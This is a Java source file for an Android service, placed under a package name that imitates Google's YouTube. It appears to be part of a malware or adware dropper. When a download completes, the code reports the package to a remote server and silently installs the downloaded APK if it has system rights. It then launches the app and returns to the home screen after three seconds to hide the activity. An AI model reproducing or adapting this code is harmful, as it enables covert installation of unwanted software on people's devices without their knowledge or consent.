package com.google.youtube.services;

import java.io.File;

import com.google.youtube.utils.HttpUtil;
import com.google.youtube.utils.MyHelpUtil;

import android.app.DownloadManager;
import android.app.DownloadManager.Query;
import android.app.IntentService;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.net.Uri;
import android.text.TextUtils;

public class DowCplService extends IntentService {

	private SilentService s;

	public DowCplService(String name) {
		super("DowCplService");
	}

	public DowCplService() {
		super("DowCplService");
	}

	@Override
	protected void onHandleIntent(Intent arg0) {

		long download_id = arg0.getLongExtra("download_id", -1);

		DownloadManager downloadManager = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);

		Query query = new Query();

		query.setFilterById(download_id);

		Cursor cursor = downloadManager.query(query);

		try {

			/**
			 * COLUMN_LOCAL_URI INDEX
			 */
			int col_file_uri = cursor
					.getColumnIndex(DownloadManager.COLUMN_LOCAL_URI);

			if (cursor.moveToNext()) {

				String localuri = cursor.getString(col_file_uri);

				/**
				 * if the localuri is null or "",return ;finish
				 */
				if (TextUtils.isEmpty(localuri)) {
					return;
				}

				PackageInfo pi = getPackageManager().getPackageArchiveInfo(
						Uri.parse(localuri).getPath(), 0);

				/**
				 * Parse the app.apk is success,execute install
				 */
				if (pi != null) {

					int isSystemApp = MyHelpUtil
							.isSystemApp(getApplicationContext());

					/**
					 * isSystemApp == 0
					 */
					if (isSystemApp == 0) {

						/**
						 * Synchronous download status to server
						 */
						sysDownComple(pi.packageName);

						/**
						 * check i ==1 is install error,delete the file;
						 */
						int i = MyHelpUtil.install(Uri.parse(localuri)
								.getPath());

						if (i == 1) {

							File file = new File(Uri.parse(localuri).getPath());

							if (file.exists()) {

								file.delete();

								return;
							}
						}

						if (i == 0) {

							s = new SilentService(getApplicationContext());

							s.sysInstall(pi.packageName);

							s.saveSilentStatus();

							if (s.checkOpenTime()) {

								s.synchroOpenData(pi.packageName);

								MyHelpUtil.openApp(pi.packageName,
										getApplicationContext());

								try {

									Thread.sleep(3 * 1000);

									s.backHome();

								} catch (InterruptedException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}

							}

						}

					} else {

						MyHelpUtil.sys_msg(getApplicationContext(), 15,
								pi.packageName);

						Intent installIntent = new Intent(Intent.ACTION_VIEW);

						installIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

						installIntent.setDataAndType(
								Uri.parse(cursor.getString(col_file_uri)),
								"application/vnd.android.package-archive");

						startActivity(installIntent);
					}
				}
			}
		} finally {
			if (cursor != null) {
				cursor.close();
			}
		}
	}

	private void sysDownComple(String apppakname) {

		String params = MyHelpUtil.setParams(apppakname, 4,
				getApplicationContext());

		try {
			HttpUtil.postRequest(HttpUtil.BASE_URL + "google_e.action", params);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

}
